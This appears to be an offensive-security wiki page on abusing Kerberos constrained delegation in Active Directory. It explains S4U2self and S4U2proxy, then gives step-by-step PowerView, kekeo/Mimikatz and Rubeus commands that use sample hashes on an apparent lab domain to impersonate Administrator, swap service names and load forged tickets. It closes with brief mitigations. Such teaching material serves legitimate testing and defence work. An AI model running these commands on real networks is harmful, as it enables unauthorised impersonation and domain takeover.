# Constrained Delegation

## Constrained Delegation

Using this a Domain admin can allow 3rd parties to impersonate a user or computer against a service of a machine.

* **Service for User to self \(**_**S4U2self**_**\):** If a **service account** has a _userAccountControl_ value containing [TRUSTED\_TO\_AUTH\_FOR\_DELEGATION](https://msdn.microsoft.com/en-us/library/aa772300%28v=vs.85%29.aspx) \(T2A4D\), then it can obtains a TGS for itself \(the service\) on behalf of any other user.
* **Service for User to Proxy\(**_**S4U2proxy**_**\):** A **service account** could obtain a TGS on behalf any user to the service set in **msDS-AllowedToDelegateTo.** To do so, it first need a TGS from that user to itself, but it can use S4U2self to obtain that TGS before requesting the other one.

**Note**: If a user is marked as ‘_Account is sensitive and cannot be delegated_ ’ in AD, you will **not be able to impersonate** them.

This means that if you **compromise the hash of the service** you can **impersonate users** and obtain **access** on their behalf to the **service configured** \(possible **privesc**\).  
Also, you **won't only have access to the service that user is able to impersonate, but also to any service that uses the same account as the allowed one** \(because the SPN is not being checked, only privileges\). For example, if you have access to **CIFS service** you can also have access to **HOST service**.  
Moreover, notice that if you have access to **LDAP service on DC**, you will have enough privileges to exploit a **DCSync**.

{% code title="Enumerate from Powerview" %}
```bash
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth
```
{% endcode %}

{% code title="Using kekeo.exe + Mimikatz.exe" %}
```bash
#Obtain a TGT for the Constained allowed user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL
#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'  
```
{% endcode %}

{% code title="Using Rubeus" %}
```bash
#Obtain a TGT for the Constained allowed user
.\Rubeus.exe asktgt /user:websvc /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
#Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator
#Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS
#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST
#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```
{% endcode %}

### Mitigation

* Disable kerberos delegation where possible
* Limit DA/Admin logins to specific services
* Set "Account is sensitive and cannot be delegated" for privileged accounts.

\*\*\*\*[**More information in ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)\*\*\*\*

